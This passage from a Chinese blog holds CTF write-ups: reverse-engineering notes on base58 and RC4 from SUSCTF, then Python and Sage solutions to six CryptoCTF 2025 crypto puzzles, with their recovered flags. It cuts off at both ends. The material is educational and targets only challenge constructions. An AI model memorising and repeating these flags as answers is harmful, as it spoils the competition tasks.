 _BYTE *ptr; // [esp+0h] [ebp-38h]  int nmemb; // [esp+4h] [ebp-34h]  unsigned __int8 *dest; // [esp+8h] [ebp-30h]  signed int size; // [esp+Ch] [ebp-2Ch]  int ii; // [esp+10h] [ebp-28h]  signed int n; // [esp+14h] [ebp-24h]  int v9; // [esp+18h] [ebp-20h]  int m; // [esp+1Ch] [ebp-1Ch]  int k; // [esp+20h] [ebp-18h]  unsigned int v12; // [esp+24h] [ebp-14h]  unsigned int v13; // [esp+24h] [ebp-14h]  signed int j; // [esp+28h] [ebp-10h]  signed int i; // [esp+2Ch] [ebp-Ch]  size = sub_1337(src);  dest = (unsigned __int8 *)malloc(size);  memcpy(dest, src, size);  dest[size] = -1;  for ( i = 0; i &lt; size &amp;&amp; !dest[i]; ++i )    ;  nmemb = 138 * size / 100 + 1;  ptr = calloc(nmemb, 1u);  for ( j = 0; j &lt; size; ++j )  &#123;    v12 = dest[j];    for ( k = 138 * size / 100; k &gt;= 0; --k )    &#123;      v13 = ((unsigned __int8)ptr[k] &lt;&lt; 8) + v12;      ptr[k] = v13 % 0x3A;      v12 = v13 / 0x3A;    &#125;  &#125;  for ( m = 0; m &lt; nmemb &amp;&amp; !ptr[m]; ++m )    ;  v9 = 0;  for ( n = 0; n &lt; i; ++n )  &#123;    v1 = v9++;    *((_BYTE *)src + v1) = 49;  &#125;  for ( ii = m; ii &lt; nmemb; ++ii )  &#123;    v2 = v9++;    *((_BYTE *)src + v2) = byte_20C0[(unsigned __int8)ptr[ii]];  &#125;  *((_BYTE *)src + v9) = -1;  free(dest);  free(ptr);&#125;\nAI告诉我这是base58编码，我看不出来（）大致流程是计算原字符串长度，分配一块1.38倍的空间，将原字符串的前导零都改写为&#39;1&#39;(49)，并将剩下的字符视为256进制大数，转化成58进制的数，这也解释了为什么需要1.38倍空间，因为$log_{58}256\\approx1.366$，再加上一点余裕。\n对于转化后的58进制数，根据byte_20C0转换为字符。这个映射表也是标准的123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz，没0没I。映射后的字符直接赋给原始字符串，最后释放所有申请的空间，完成一次base58。\nint __cdecl sub_16E2(int a1, char *s)&#123;  int v3[68]; // [esp+8h] [ebp-110h] BYREF  sub_123D((int)v3, s);  return sub_1368(v3, a1);&#125;int __cdecl sub_123D(int a1, char *s)&#123;  int result; // eax  char v3; // [esp+Fh] [ebp-19h]  signed int v4; // [esp+10h] [ebp-18h]  int j; // [esp+14h] [ebp-14h]  int v6; // [esp+18h] [ebp-10h]  int i; // [esp+1Ch] [ebp-Ch]  v4 = strlen(s);  for ( i = 0; i &lt;= 255; ++i )    *(_BYTE *)(a1 + i) = i;  v6 = 0;  for ( j = 0; j &lt;= 255; ++j )  &#123;    v6 = (*(unsigned __int8 *)(a1 + j) + v6 + (unsigned __int8)s[j % v4]) % 256;    v3 = *(_BYTE *)(a1 + j);    *(_BYTE *)(a1 + j) = *(_BYTE *)(a1 + v6);    *(_BYTE *)(v6 + a1) = v3;  &#125;  *(_DWORD *)(a1 + 256) = 0;  result = a1;  *(_DWORD *)(a1 + 260) = 0;  return result;&#125;int __cdecl ·(int a1, int a2)&#123;  int result; // eax  char v3; // [esp+Fh] [ebp-15h]  int v4; // [esp+10h] [ebp-14h]  int i; // [esp+14h] [ebp-10h]  int v6; // [esp+18h] [ebp-Ch]  int v7; // [esp+1Ch] [ebp-8h]  v4 = sub_1337(a2);  v7 = *(_DWORD *)(a1 + 256);  v6 = *(_DWORD *)(a1 + 260);  for ( i = 0; i &lt; v4; ++i )  &#123;    v7 = (v7 + 1) % 256;    v6 = (v6 + *(unsigned __int8 *)(a1 + v7)) % 256;    v3 = *(_BYTE *)(a1 + v7);    *(_BYTE *)(a1 + v7) = *(_BYTE *)(a1 + v6);    *(_BYTE *)(v6 + a1) = v3;    *(_BYTE *)(i + a2) ^= *(_BYTE *)(a1 + (unsigned __int8)(*(_BYTE *)(a1 + v7) + *(_BYTE *)(a1 + v6)));  &#125;  *(_DWORD *)(a1 + 256) = v7;  result = a1;  *(_DWORD *)(a1 + 260) = v6;  return result;&#125;\nAI很容易就看出了它是RC4算法，sub_123D是密钥生成过程，给数组v3前256个字节赋值0到255并打乱，还将[a1 + 256]和[a1 + 260]赋值为0，它们最后成为了计数器；sub_1368执行更新计数器和交换操作，将加密的数据放回原来的数组中。\n好消息是，异或和同一个key的RC4加密，连续两次都可以抵消，因此实际上原始flag只异或1次，再base58编码5次得到密文，倒推即可得到flag。\n一个饼干人附件是一个APK，简单看看assets和lib发现结构异常熟悉，这不是Unity吗，还是il2cpp打包的，这下有得逆了。\n然后有一个提示——\n\n黄金芝士饼干说ab is so delicious\n\n好的不用逆了，三分钟的事。看到ab立刻想到Unity的资源存储方式asset bundle，因此我们需要加载这个APK的所有资源包。现在最新的软件是AssetRipper，将apk解压，整个文件夹导入即可找到所有资源包，资源居然都没有加密，真是太好心了。\n找到一个包叫delicious，里面是四个Texture2D，也就是图片，四张图都是flag的一部分，但是略有重叠，去PS拼一拼就好了。\n\n\n写在最后第二次打了，大学生活其实过得也蛮快的，还能打几次呢？不知道，总之珍惜每一场比赛了。\n学校里不太多密码学师傅，但是我的技术也不怎么样，努力学习吧。\n","categories":["笔记"],"tags":["SUSCTF","Writeup","2025"]},{"title":"2025 CryptoCTF 题解","url":"/2025/07/15/2025%20CryptoCTF%E9%A2%98%E8%A7%A3/","content":"前言最近正值暑假，闲着也是闲着，于是来玩玩吧。我发现自己真的很弱小，这些赛题的分值与解出的队伍数量成反比，将所有的题目按照最终分值排序，我恰好完成了分值最少的四道。加上事后补的两道，共完成了分值最少的六道。\n——就是说难的一道都不会（躺）\n正文既然都这样了，那干脆就按照最终题目分数升序写题解吧，按理来说，越前面的越简单。\n1.Vinad观察代码，我们得到了pubkey的第1和第2项，即R和p*q，和加密后的c。若要解出原文，需要得到p或者q，以及e。在genkey()函数中，q是随机生成的512位质数，p和e都与函数vinad()有关，我们自然想知道，vinad()在做什么。对于给定的列表R，vinad()取出每一个元素r，将其与x异或，返回异或后的&#39;1&#39;的个数的奇偶，奇数为1，偶数为0。将所有的r如此操作，结果拼成的字符串就是返回值的二进制形式。假设其中某两次取出的元素为$r_1$和$r_2$，那么，记$x \\oplus r_1 = k_1$，$x \\oplus r_2 = k_2$，则$k_1 \\oplus k_2 = \\text{XOR}(x,r_1,x,r_2)$。而$x \\oplus x = 0$，对结果没有影响，所以$k_1 \\oplus k_2 = r_1 \\oplus r_2$。其中$\\oplus$符号和$\\text{XOR}$均表示异或。这样一来，虽然x是一个很大的未知数，但任意两个结果的异或值都已经能从R中知晓，换言之，只要知道了其中一个结果(0或者1)，就知道了全部的结果。x实际上和只能取0/1没有区别。所以，我们取x=0，得到Q = int(&#39;&#39;.join(str(parinad(R[i])) for i in range(512)), 2)，得到p的一个候选值；如果n%Q!=0，即Q不正确，那么，将每一位取反，就是另一个候选值Q_alt。经过验证，可以得到p和q。\n对于e，我们已经分析得到vinad()函数在R给定的情况下只有两种可能的结果，用Q和Q_alt试两次就可以。\n#Crypto CTF https://cr.yp.toc.tf/ vinad题解from Crypto.Util.number import *R = [] #R太占版面了，就删掉了。题目附件里已经给出n = 58113574203067314600162910771848744432179168354040678920098167335472534222998261639291145191568159464990603689062679467360303185717662426122140998218656632568172511390111887830539687208220100574329903748617343193392646019854280519859403817579746765861359633174218846216669659258251676438195667516224684805919c = 56754194307199340085459028397027924827853574000671575387226403396873568994756738512141122143372650573201079937375922460851170745485734799044781029943783218210457587599666501326645229924138230588050782907693019958930006807017898115655426823272342984109999519420817119999272583495848119171867835187241510764427def parinad(n):    return bin(n)[2:].count(&#x27;1&#x27;) % 2# 1. 求出p和qQ = int(&#x27;&#x27;.join(str(parinad(R[i])) for i in range(512)), 2)Q_alt = (1&lt;&lt;512) - 1 - Qif n % Q == 0 and isPrime(Q):    p = Qelse:    p = Q_alt#print(p)assert isPrime(p) and n%p==0#print(sum(R))e = Q_altq = n//p# 2. 计算欧拉函数 φ(n)phi_n = (q - 1)*(p - 1)#print(&quot;phi = &quot;,phi_n)# 3. 计算 d (e 的模 φ(n) 的乘法逆元)d = inverse(e, phi_n)#print(&quot;d = &quot;,d)# 4. 解密消息 mm = pow(c, d, n)  # 快速模幂运算print(&quot;解密后的消息 m 为:&quot;, long_to_bytes(m - sum(R)))#CCTF&#123;s0lV1n9_4_Syst3m_0f_L1n3Ar_3qUaTi0n5_0vEr_7H3_F!3lD_F(2)!&#125;#本题由ChatGPT提供思路与代码\n2.Interpol观察代码，randpos()函数在0和1之间选一个数。如果选1，返回True和一个有两个数的元组，这两个数和flag相关；如果选0，返回False和另外一个元组，这个元组的两个数是一个随机整数和一个随机的有理数。接下来是while(True)部分：先得到一个randpos()的结果，如果返回True，那么n自增1，否则n不增加。但无论如何，DATA都会将新生成的元组加入，例外情况是_d[0][0]在H中，即元组的第一个数在H中。接下来使用拉格朗日插值，将以上元组表示的点变为一个有理数域的函数，我们最后得到了这个函数。因此，函数上的点就包含了flag上的点，根据randpos()函数我们可以发现，由flag得到的点，其横坐标一定是负数，纵坐标一定是整数，而随机点的横坐标大于等于0，纵坐标也是两个质数之比，不会是整数。我们据此得到所有满足x&lt;0的整点，就是由flag得到的点。对于点(-x,y)，我们有x = 1 + (19*n - 14) % len(flag)，y = ord(flag[(63 * n - 40) % len(flag)])。（n&lt;len(flag)）即：$n = (x + 13) \\times \\text{inverse}(19)\\space \\bmod \\text{len(flag)}$，$\\text{chr}(y) = \\text{flag}[(63 \\times n - 40)\\space \\bmod \\text{len(flag)}]$。于是可以根据每个x得到对应的n，进而得到flag中每个字符的位置。这里假设len(flag)和19，和63均互质，否则，flag不唯一。\n#Crypto CTF https://cr.yp.toc.tf/ Interpol题解#!/usr/bin/env sage# 从 output.raw 加载序列化多项式with open(&#x27;output.raw&#x27;, &#x27;rb&#x27;) as f:    poly_str = f.read()# 反序列化多项式P = loads(poly_str)# 定义多项式函数 p(x)p = P# 步骤1: 收集候选真点 (x, y)，其中 x 为负整数，p(x) 为整数points = []x_val = -1consecutive_non_integer = 0threshold = 20  # 连续非整数阈值，用于停止迭代while consecutive_non_integer &lt; threshold:    try:        y_val = p(x_val)  # 计算 p(x)        # 检查是否为整数（有理数且分母为1）        if y_val in ZZ or (y_val in QQ and y_val.denominator() == 1):            points.append((x_val, ZZ(y_val)))  # 记录点            consecutive_non_integer = 0  # 重置计数器        else:            consecutive_non_integer += 1    except Exception as e:  # 处理可能的求值错误（如 x 过大）        consecutive_non_integer += 1    x_val -= 1  # 移至下一个负整数if not points:    raise ValueError(&quot;未找到候选点。检查文件路径或多项式。&quot;)# 按 x 排序（降序：-1, -2, -3, ...）points.sort(key=lambda pt: pt[0], reverse=True)# 步骤2: 推导 L = len(flag)min_x = min(x for x, y in points)  # 最小 x（最负）L_candidate = -min_x  # L = -min_xnum_points = len(points)# 验证点数是否合理（应接近 L_candidate）if num_points &lt; L_candidate:    print(f&quot;警告: 只找到 &#123;num_points&#125; 个点，但 L_candidate = &#123;L_candidate&#125;。可能有遗漏。&quot;)elif num_points &gt; L_candidate:    print(f&quot;警告: 找到 &#123;num_points&#125; 个点，但 L_candidate = &#123;L_candidate&#125;。可能有误报。&quot;)    # 截断至前 L_candidate 个点（假设 x 最小的点可能为误报）    points = points[:L_candidate]L = L_candidate  # 使用 L_candidate 作为 flag 长度# 步骤3: 计算 19 模 L 的逆元（用于索引映射）try:    inv19 = inverse_mod(19, L)  # 19 在模 L 下的逆元except Exception as e:    raise ValueError(f&quot;19 和 L=&#123;L&#125; 不互质，无法计算逆元。错误: &#123;e&#125;&quot;)# 步骤4: 映射每个点到 flag 字符flag_array = [None] * L  # 初始化 flag 数组for x, y in points:    # 计算 a = (19n - 14) % L（来自真点 x 公式）    a = -1 - x  # 因为 x = -(1 + a)    if a &lt; 0 or a &gt;= L:        print(f&quot;警告: x=&#123;x&#125; 的 a=&#123;a&#125; 超出 [0, L-1]。跳过。&quot;)        continue        # 计算 n（真点索引）    c = a + 14  # 来自 a = (19n - 14) % L    n_val = (c * inv19) % L  # n = (c * inv19) mod L        # 计算 b（flag 字符位置）    b_val = (63 * n_val - 40) % L  # b = (63n - 40) % L        # 检查 y 是否为可打印 ASCII    if y &lt; 32 or y &gt; 126:        print(f&quot;警告: x=&#123;x&#125; 的 y=&#123;y&#125; 不是可打印 ASCII。跳过。&quot;)        continue        # 存储字符（位置 b_val）    flag_array[b_val] = chr(y)# 检查是否所有位置都已填充if None in flag_array:    missing = [i for i, char in enumerate(flag_array) if char is None]    print(f&quot;警告: 位置 &#123;missing&#125; 未填充。尝试调整点集合或 L。&quot;)else:    print(&quot;所有位置填充成功。&quot;)# 构建 flag 字符串flag_str = &#x27;&#x27;.join(flag_array)print(f&quot;恢复的 flag: &#123;flag_str&#125;&quot;)#CCTF&#123;7h3_!nTeRn4t10naL_Cr!Min41_pOlIc3_0r9An!Zati0n!&#125;#本题由ChatGPT和Deepseek提供思路，Deepseek提供代码\n3.Mechanic代码很短，但是遇见了不认识的库，多半是在调用库函数加密了，上网找找如何解密。搜索KryptonKEM找到了https://github-wiki-see.page/m/aabmets/quantcrypt/wiki/Code-Examples，看到“KryptonKEM for Asymmetric File Encryption”一节，找到了相关的示例代码。加密的流程是，读取flag.png，生成40位随机数，根据该随机数的比特，决定是对明文/上一轮密文进行一次加密，并将skey(secret_key)写入文件中，还是伪造一组skey写入文件中。因此，一共生成了40次密钥，其中有部分是真的，也有一些是假的。根据最后的文件名flag_22.enc，一共进行了23轮加密。同时我们可以知道，先加密的密钥一定在后加密的密钥之前。所以，我们可以从最后一个密钥开始，不断向前试探，得到最初的文件。如果遇到假私钥，解密会报错，根据能否解密判断是否为真的私钥。为了防止解密中间文件被占用而无法写入，每一个文件都使用不同的文件名。运行一遍程序，就可以得到最初的flag.png以及，kem.param_sizes.sk_size = 3168（自己偷偷装这个库，在python跑一遍就知道了）\n#Crypto CTF https://cr.yp.toc.tf/ mechanic题解#!/usr/bin/env python3from quantcrypt.kem import MLKEM_1024from quantcrypt.cipher import KryptonKEMfrom pathlib import Pathkem = MLKEM_1024()kry = KryptonKEM(MLKEM_1024)SK_SIZE = 3168TOTAL_LAYERS = 23# --- 1. 读取并切分 output.raw ---raw = Path(&#x27;output.raw&#x27;).read_bytes()assert len(raw) % SK_SIZE == 0, &quot;output.raw 长度必须是 SK_SIZE 的整数倍&quot;chunks = [ raw[i:i+SK_SIZE]           for i in range(0, len(raw), SK_SIZE) ]# --- 2. 准备初始密文路径 ---current_ct = Path(&#x27;flag_22.enc&#x27;)found_sks = []# 从后往前遍历每一段私钥for idx, sk in enumerate(reversed(chunks)):    if len(found_sks) &gt;= TOTAL_LAYERS:        break    # 生成唯一的临时输出文件名    tmp_path = Path(f&#x27;tmp_&#123;len(found_sks)&#125;.out&#x27;)    try:        # 解密到唯一文件        kry.decrypt_to_file(sk, current_ct, tmp_path)        # 解密成功，记录私钥，并更新 current_ct        found_sks.append(sk)        current_ct = tmp_path        print(f&quot;✔ 用 chunks[&#123;len(chunks)-1-idx&#125;] 解出了第 &#123;len(found_sks)&#125; 层 → &#123;tmp_path.name&#125;&quot;)    except Exception as e:        print(&quot;ERROR: &quot;,e)        continueassert len(found_sks) == TOTAL_LAYERS, &quot;没找到所有私钥段！&quot;# 最终把 current_ct 重命名为 flag.pngcurrent_ct.rename(&#x27;flag.png&#x27;)print(&quot;🎉 已成功还原出 flag.png&quot;)#CCTF&#123;k3y_3NcAp5uL4t!0n_M3cH4n1Sms!&#125;#本题由ChatGPT提供思路和代码，略做修正\n4.Mancity气急败坏的典型示例——不过还是先分析一下代码吧keygen()生成了两个质数，这两个质数都由同一个256bit的质数p变化而来，质数r在p的每一个bit后都增加一个&#39;1&#39;，质数q在p后面增加256个&#39;1&#39;，这样q和r都是512位质数，且其中一半的位我们已经知道了假设bin(p)=10010…01，则r = 1101011101…0111，q = 10010…011111…11，则q的低256位已知。我们将q和r划分为high和low，其中高256位为high，低256位为low，则$q_{low} = 2^{256}-1$。对$n = q*r$两边同时模$2^{256}$，则可知$n$的低256位完全由$q_{low}$和$r_{low}$决定，于是可以求$q_{low}$的逆元，乘上$n$的低256位，再模$2^{256}$，得到$r_{low}$。$r_{low}$的二进制形式里，有一半是&#39;1‘，另一半是p的低128位。由此我们得到了p的低128位，也就是q的256-383位，于是可以重复上述过程，每次只需要调整模数，就可以不断向p的高位推进。理论上这个方法可以推进到只剩最后1位未知，实际上运行到240位的时候就报错了，不过剩下16位并不算多，暴力破解一轮即可。得到p后推出q和r，进而还原消息m。\n事后发现，如果$r_{low}$解出来的最高位是0，那么填充1的位置不会被正确检测到，因而不能得到正确的p。我增加了对于$r_{low}$比特长度的检测，如果是奇数，就补上最前面的&#39;0&#39;，这样就可以继续解码了。枉我气急败坏，甚至写了5个同样的函数去做同一件事……还是不够老练只需要使用最后的recover()函数，循环代入每一轮的p，加上最后256个&#39;1&#39;作为$q_{low}$，即可解出。\n#Crypto CTF https://cr.yp.toc.tf/ Mancity题解def decode(p_man:str):    orig_bits = &#x27;&#x27;    for i in range(0, len(p_man), 2):        two_bits = p_man[i:i + 2]        if two_bits == &#x27;01&#x27;:            orig_bits += &#x27;0&#x27;        elif two_bits == &#x27;11&#x27;:            orig_bits += &#x27;1&#x27;        else:            raise ValueError(f&quot;Invalid bit pair: &#123;two_bits&#125;&quot;)    return orig_bitsdef recover_256(n:int):    q = 2**256-1    modulus = 2 ** (32 + 64 + 128 + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return pdef recover_128(n:int):    q = int(&#x27;11011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111&#x27;+&#x27;1&#x27;*256,2)    modulus = 2 ** (32 + 64 + 128 + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return pdef recover_64(n:int):    q = int(&#x27;111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111&#x27;+&#x27;1&#x27;*256,2)    modulus = 2 ** (32 + 64 + 128 + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return pdef recover_32(n:int):    q = int(&#x27;11110111000111010010000101100001111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111&#x27;+&#x27;1&#x27;*256,2)    modulus = 2 ** (32 + 64 + 128 + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return pdef recover_16(n:int):    q = int(&#x27;110101000111000011110111000111010010000101100001111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111&#x27;+&#x27;1&#x27;*256,2)    modulus = 2 ** (32 + 64 + 128 + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return pdef recover(n:int,q_bit:str):    q = int(q_bit+&#x27;1&#x27;*256, 2)    modulus = 2 ** (len(q_bit) + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return p# 给定参数n = 147170819334030469053514652921356515888015711942553338463409772437981228515273287953989706666936875524451626901247038180594875568558137526484665015890594045767912340169965961750130156341999306808017498374501001042628249176543370525803456692022546235595791111819909503496986338431136130272043196908119165239297# 恢复因子#p = recover_256(n)#print(decode(p))#第一轮的p:11011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111#这是最低的128位#p2 = recover_128(n)#print(decode(p2))#第二轮的p:111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111#这是128+64=192位#p3 = recover_64(n)#print(decode(p3))#第三轮的p：11110111000111010010000101100001111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111#128+64+32=224位#p4 = recover_32(n)#print(decode(p4))#110101000111000011110111000111010010000101100001111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111#...+16=240位for i in range(10000,2**18):    s = bin(i)[2:] + &#x27;110101000111000011110111000111010010000101100001111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111&#x27; + &#x27;1&#x27;*256    q = int(s, 2)    if not (n%q):        print(q)        break#b&#x27;CCTF&#123;M4nch3sReR_c0D!ng_wI7H_RSA&#125;&#x27;#本题由自己提供思路和代码\n5.Vainrat这题……我都想原封不动放到我们学校的校赛或者类似的比赛上了，如果我有机会的话。太阴了，阴得没边。服务器创建精度为440位的实数域，每次交互时，输入c获取最新的y值，输入q退出。但是，只有尝试的次数足够多，才能抓到老鼠，得到位置，至少需要20次尝试以后，才能稳定获得y。我们的目标是得到x0，也就是flag转为整数后前面加小数点。由于每次求平均数和开方都会有精度损失，最后可能不能一次解出完整的flag，需要修正。因此我们需要从可以得到的yi中，获得上一步的信息，直到最终的x0。研究一下rat()函数：第一行将x和y求平均数，第二行将上一步的x和y求几何平均数，最后返回新的x和新的y。如果直接把代码丢给AI，AI们很容易误以为这段代码是求x和y的算数平均数(AM)和几何平均数(GM)，并将AM赋给x，GM赋给y。因为被AI阴了导致没做出来，其实不难的。以及，多次试验会发现，y会越来越小。如果当成AMGM，那每个y都应该小于对应的x，这样y应该越来越大。我先得到两组连续的y。这里运气不错得到了$y_{19}$和$y_{20}$，如果没得到$y_{19}$，拿$y_{21}$也一样。我们有公式$x_i = \\frac{(x_{i-1} + y_{i-1})}{2}$，$y_i = \\sqrt{x_i y_{i-1}}$。因此，根据连续的$y_i$，$y_{i-1}$，可以得到$x_i = \\frac{y_i^2}{y_{i-1}}$。这样我们就有了一组$x_i$和$y_i$。有了$x_i$和$y_i$，就有$y_{i-1} = \\frac{y_i^2}{x_i}$，$x_{i-1} = 2x_i - y_{i-1} = 2x_i - \\frac{y_i^2}{x_i}$，写出函数。因为懒得打理变量所以即使x回到$x_0$了变量名还是x19（）总之这样就能得到x0了。但是我们不知道flag有多少位，所以需要一位一位尝试，转成比特后全都是可打印字符的/以CCTF开头的就是可能的解。\n#Crypto CTF https://cr.yp.toc.tf/ vainrat题解from decimal import *from Crypto.Util.number import long_to_bytes&#x27;&#x27;&#x27;def rat(x, y):\tx = R(x + y) * R(0.5)\ty = R((x * y) ** 0.5) #这个x是上一步的x!也就是算数平均数，而不是参数x\treturn x, y&#x27;&#x27;&#x27;getcontext().prec = 460def return_previous(x:Decimal,y:Decimal)-&gt;(Decimal, Decimal):    return (Decimal(2)*x - (y**2/x),y**2/x)def is_bytes_printable(data):    &quot;&quot;&quot;    判断bytes对象是否可打印。    Args:        data: bytes对象。    Returns:        如果bytes对象可打印，返回True，否则返回False。    &quot;&quot;&quot;    for byte in data:        if not (32 &lt;= byte &lt;= 126):  # 检查是否在ASCII可打印字符范围            return False    return Truey20 = Decimal(&#x27;0.850721739388853613891153549431010808552676731821999538996176033215422247824841783375972792896987047341958120004524577777036176502090&#x27;)y19 = Decimal(&#x27;0.850721739389079303159246072119468136821544049380443888847082554769733382902933214834218375079868150945588972107307455168793172804985&#x27;)y0 = Decimal(&#x27;0.939435784300590373652615235586222521209371224933347916892430414723880727978737194445756901098227178356345123621981413057062575844130&#x27;)x19 = Decimal(2)*y20**Decimal(2)/y19 - y19for i in range(19):    x19,y19 = return_previous(x19,y19)print(&quot;x = &quot;, x19, &quot;y = &quot;, y19)assert abs(y0 - y19) &lt;Decimal(&quot;0.0000000000000000000000000000000000000000000000000000001&quot;)for i in range(1,461):    res = int(x19*(10**i))    if(is_bytes_printable(long_to_bytes(res))): print(long_to_bytes(res))#CCTF&#123;h3Ur1s7!c5_anD_iNv4rIanTs_iN_CryptoCTF_2025!&#125;#本题由ChatGPT和Deepseek提供错误思路，自行调试得到思路和代码\n6.Matemithflag分成了长为14的段，但是不知道有多少段，由于后面使用了M[0]到M[5]，我们就假设它有6段吧。f到k共6个函数，次数都是2~3次，变量也很多，所有的系数都是小于某个313位质数p的随机数。然后，将每个函数转换到有理数域R上，代入u到z为M[0]到M[5]，计算出结果存入CNST。例：f(M[0], M[1], M[2], M[3], M[4], M[5]) = COEFS[0] * M[0] * M[1] + COEFS[1] * M[0] + COEFS[2] * M[1]之后对于每一个函数都加上一个常数项，常数项是p减去上面的计算结果，再模p，也就是说，在模p的意义下，每个函数都满足function(M[0], M[1], M[2], M[3], M[4], M[5])-CNST[function] ≡ 0 (mod p)因此，我们需要求出满足六个同余方程的解，并选出长度均为14字节的整数结果。由于方程较多，变量较多，次数也较高，可以分批求解。观察发现，函数f, h, j只有u,v,w三个变量，可以解出它们。利用Sagemath的求解器进行求解，有一个明显短的结果，再用u,v,w代入另外三个方程，这样就只剩三个变量，同样可以解出。\n#Crypto CTF https://cr.yp.toc.tf/ matemith题解from Crypto.Util.number import *# 定义模数 pp = 9892984422801315119260311427714389408772405421306235794826917610128461644036928139298330716261F = GF(p)  # 创建有限域# 将系数转换为有限域元素a1 = F(8593371583346286129538282168765198524220954884352992069219549555526097253129502925759872761483)b1 = F(8192555264287905175212103898575474256555217842060435386769432116145712989123062847161390929397)c1 = F(9598573789403814092125115160545174167539204328557118715540593719644188998531033259685435430387)d1 = F(5738603225260621554442220996093767502015758942320213371600986432070445300427944977409453429117)a2 = F(6107224904478508858527197508483774405356161856691777460732363192128980355274418091837270668258)b2 = F(3584245173493717638976874408629921683995390608944250077841702023698807664457252845973088744491)c2 = F(5646173287331462026544218972062953582608380797148923127395811758145598594972832047259631339566)d2 = F(1994681139685786114971936867358158466232859433926848067961874687630342141141862187589124089741)a3 = F(1912186465211454827473018892315659311053527670028135595953520151335825509122313783795561869379)b3 = F(6246883466276200389231653597272295993565421216541002743075041326054203024921176043191679609212)c3 = F(4002308425802254921531592700910138281674785127934610897914017993007060136199147207365547047048)d3 = F(973159800079995512996976852328990077106942094656694887771601292254542762394381629810393447820)# 声明多项式环和变量R.&lt;u,v,w&gt; = PolynomialRing(F)# 定义方程f = a1*u*v + b1*u + c1*v + d1h = a2*u*w + b2*u + c2*w + d2j = a3*v*w + b3*v + c3*w + d3# 创建理想I = R.ideal([f, h, j])# 计算解集solutions = I.variety()# 输出结果if solutions:    print(f&quot;找到 &#123;len(solutions)&#125; 个解:&quot;)    for i, sol in enumerate(solutions, 1):        # 验证解        f_val = f.subs(sol)        h_val = h.subs(sol)        j_val = j.subs(sol)        print(f&quot;\\n验证: f=&#123;f_val&#125;, h=&#123;h_val&#125;, j=&#123;j_val&#125;&quot;)        print(f&quot;解 &#123;i&#125;:&quot;)        print(f&quot;u = &#123;sol[u]&#125;, &#123;long_to_bytes(int(sol[u]))&#125;&quot;)        print(f&quot;v = &#123;sol[v]&#125;,  &#123;long_to_bytes(int(sol[v]))&#125;&quot;)        print(f&quot;w = &#123;sol[w]&#125;,  &#123;long_to_bytes(int(sol[w]))&#125;&quot;)        else:    print(&quot;未找到解&quot;)# 已知的 u, v, w 值u = F(1078804227986401794161149736863793)v = F(2033644392583863279506423899386719)w = F(1631639702310041336611888741434165)# 将系数转换为有限域元素# g 的系数a1 = F(7737077144206080155196706693824644356475708615710271404071364943161652008584970269394416250641)a2 = F(6282097687310252658473848438985225466620614743750918909885172321224925965646628839166491648752)a3 = F(7737077144206080155196706693824644356475708615710271404071364943161652008584970269394416250641)a4 = F(3354788147890488743832873565215769634619909759459203496980671578348799162553954862104978291860)a5 = F(2560270290674636359252235177920929027441112715609783111306743340637878970846852799006820932563)# i 的系数b1 = F(7622670835797214156123791992548663880284352234566921286637648219243086701251627093499322050472)b2 = F(6026769215097777844835562389865313764490318485655789123763637718591748620654875700763740623760)b3 = F(8145050175261359549200629067766090532616263522561328878195831921153188650784907223634130346224)b4 = F(3622105614070476540808786980829452605696331317022729645355376801209444137548670550164418237117)b5 = F(4800360746061605999597274870855047707130861888252519642520437605796496240599924899885487900040)# k 的系数c1 = F(1423338294606985951732736428034353751447528399559929388138157330118213387990891693204997290038)c2 = F(784018806462384388182217012266169299116410899849461442885543245867941419322406775218178098109)c3 = F(7684681843989505989596042520590550892565982707534588920361260899638313817214040416765327284778)c4 = F(4982848574842913858489870338816729222210785430242027484672099513487039514577513464674726403409)c5 = F(7781690757622738625626304200561818137843970209349935834539461705684625161407233281360563620790)# 定义多项式环R.&lt;x, y, z&gt; = PolynomialRing(F)# 代入已知的 u, v, w 后，g, i, k 成为关于 x, y, z 的方程g = a1 * u * x * y + a2 * v + a3 * x + a4 * y + a5i = b1 * v * y * z + b2 * w + b3 * y + b4 * z + b5k = c1 * w * x * z + c2 * u + c3 * x + c4 * z + c5# 创建理想I = R.ideal([g, i, k])# 求解方程组solutions = I.variety()# 输出结果if solutions:    print(f&quot;找到 &#123;len(solutions)&#125; 个解:&quot;)    for idx, sol in enumerate(solutions):        